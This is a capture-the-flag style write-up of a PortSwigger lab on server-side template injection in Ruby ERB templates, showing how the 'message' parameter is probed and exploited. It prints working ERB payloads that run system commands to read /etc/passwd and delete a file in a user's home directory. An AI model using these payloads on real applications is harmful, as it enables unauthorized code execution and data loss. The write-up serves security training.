
# Basic server-side template injection

This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.


---------------------------------------------

References: 

- https://portswigger.net/web-security/server-side-template-injection/exploiting

- https://www.trustedsec.com/blog/rubyerb-template-injection/

- https://twitter.com/harshbothra_/status/1498324305872318464?lang=en



![img](images/Basic%20server-side%20template%20injection/1.png)

---------------------------------------------

The first post returns an error:



![img](images/Basic%20server-side%20template%20injection/2.png)


This is generated with a GET request which controls the displayed message:



![img](images/Basic%20server-side%20template%20injection/3.png)


I tried to send the URL-encoded version of this payload from the examples:

```
<%
                import os
                x=os.popen('id').read()
                %>
                ${x}
```

```
GET /?message=%3c%25%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%6d%70%6f%72%74%20%6f%73%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%78%3d%6f%73%2e%70%6f%70%65%6e%28%27%69%64%27%29%2e%72%65%61%64%28%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%25%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%7b%78%7d
```

And generated the following error:



![img](images/Basic%20server-side%20template%20injection/4.png)


We can find information about SSTI in Erb in this [Trustedsec blog](https://www.trustedsec.com/blog/rubyerb-template-injection/):

```
GET /?message=<%=+4*4+%>
```



![img](images/Basic%20server-side%20template%20injection/5.png)


It is possible to execute code with a payload like this:

```
GET /?message=<%=+system('cat+/etc/passwd')+%>

GET /?message=<%=+system('rm+/home/carlos/morale.txt')+%>
```







![img](images/Basic%20server-side%20template%20injection/6.png)
![img](images/Basic%20server-side%20template%20injection/7.png)